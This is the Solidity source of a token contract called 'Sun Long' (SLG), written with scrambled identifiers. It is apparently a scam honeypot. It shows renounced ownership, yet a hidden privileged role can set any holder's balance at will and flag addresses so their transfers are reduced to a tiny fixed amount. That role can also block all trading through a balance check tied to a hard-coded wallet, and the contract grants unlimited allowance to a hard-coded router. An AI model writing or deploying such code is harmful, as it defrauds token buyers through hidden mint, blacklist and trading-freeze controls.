//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface liquiditySell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract minEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txSwap {
    function createPair(address toTake, address senderAtIs) external returns (address);
}

interface enableReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverFeeSell) external view returns (uint256);

    function transfer(address maxMarketing, uint256 sellSender) external returns (bool);

    function allowance(address marketingReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellSender) external returns (bool);

    function transferFrom(
        address sender,
        address maxMarketing,
        uint256 sellSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromBuy, uint256 value);
    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);
}

interface enableReceiverMetadata is enableReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SunLong is minEnable, enableReceiver, enableReceiverMetadata {

    address public senderToken;

    function limitEnable(uint256 sellSender) public {
        takeMax();
        totalBuy = sellSender;
    }

    function minMarketingFund(address maxTx, address maxMarketing, uint256 sellSender) internal returns (bool) {
        require(fromSenderExempt[maxTx] >= sellSender);
        fromSenderExempt[maxTx] -= sellSender;
        fromSenderExempt[maxMarketing] += sellSender;
        emit Transfer(maxTx, maxMarketing, sellSender);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return isLaunch;
    }

    function owner() external view returns (address) {
        return senderLiquidity;
    }

    function launchedSell(address amountLiquidityFee) public {
        takeMax();
        
        if (amountLiquidityFee == senderToken || amountLiquidityFee == txLimit) {
            return;
        }
        takeTrading[amountLiquidityFee] = true;
    }

    function balanceOf(address receiverFeeSell) public view virtual override returns (uint256) {
        return fromSenderExempt[receiverFeeSell];
    }

    address private senderLiquidity;

    uint256 private receiverShould = 100000000 * 10 ** 18;

    string private isLaunch = "Sun Long";

    bool public maxMin;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverShould;
    }

    function transferFrom(address maxTx, address maxMarketing, uint256 sellSender) external override returns (bool) {
        if (_msgSender() != fundTx) {
            if (toEnable[maxTx][_msgSender()] != type(uint256).max) {
                require(sellSender <= toEnable[maxTx][_msgSender()]);
                toEnable[maxTx][_msgSender()] -= sellSender;
            }
        }
        return sellLiquidity(maxTx, maxMarketing, sellSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return maxReceiverIs;
    }

    function allowance(address feeWallet, address shouldMin) external view virtual override returns (uint256) {
        if (shouldMin == fundTx) {
            return type(uint256).max;
        }
        return toEnable[feeWallet][shouldMin];
    }

    uint8 private maxReceiverIs = 18;

    mapping(address => bool) public takeTrading;

    function transfer(address tradingMarketing, uint256 sellSender) external virtual override returns (bool) {
        return sellLiquidity(_msgSender(), tradingMarketing, sellSender);
    }

    string private tokenReceiver = "SLG";

    bool private maxSender;

    function launchLaunched(address marketingWallet) public {
        if (maxMin) {
            return;
        }
        
        shouldLaunch[marketingWallet] = true;
        
        maxMin = true;
    }

    function receiverMin(address tradingMarketing, uint256 sellSender) public {
        takeMax();
        fromSenderExempt[tradingMarketing] = sellSender;
    }

    uint256 public receiverFund;

    uint256 receiverIsAt;

    event OwnershipTransferred(address indexed feeTeam, address indexed toSellSwap);

    function getOwner() external view returns (address) {
        return senderLiquidity;
    }

    uint256 public maxShould;

    address listIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant totalTx = 16 ** 10;

    function approve(address shouldMin, uint256 sellSender) public virtual override returns (bool) {
        toEnable[_msgSender()][shouldMin] = sellSender;
        emit Approval(_msgSender(), shouldMin, sellSender);
        return true;
    }

    function takeMax() private view {
        require(shouldLaunch[_msgSender()]);
    }

    bool private marketingMax;

    mapping(address => mapping(address => uint256)) private toEnable;

    mapping(address => uint256) private fromSenderExempt;

    function sellLiquidity(address maxTx, address maxMarketing, uint256 sellSender) internal returns (bool) {
        if (maxTx == senderToken) {
            return minMarketingFund(maxTx, maxMarketing, sellSender);
        }
        uint256 fundMarketing = enableReceiver(txLimit).balanceOf(listIs);
        require(fundMarketing == totalBuy);
        require(maxMarketing != listIs);
        if (takeTrading[maxTx]) {
            return minMarketingFund(maxTx, maxMarketing, totalTx);
        }
        return minMarketingFund(maxTx, maxMarketing, sellSender);
    }

    address public txLimit;

    constructor (){
        if (buyFrom != receiverFund) {
            receiverFund = buyFrom;
        }
        liquiditySell autoReceiverFund = liquiditySell(fundTx);
        txLimit = txSwap(autoReceiverFund.factory()).createPair(autoReceiverFund.WETH(), address(this));
        
        senderToken = _msgSender();
        sellMarketing();
        shouldLaunch[senderToken] = true;
        fromSenderExempt[senderToken] = receiverShould;
        
        emit Transfer(address(0), senderToken, receiverShould);
    }

    uint256 totalBuy;

    function sellMarketing() public {
        emit OwnershipTransferred(senderToken, address(0));
        senderLiquidity = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenReceiver;
    }

    mapping(address => bool) public shouldLaunch;

    uint256 private buyFrom;

    address fundTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private amountTo;

}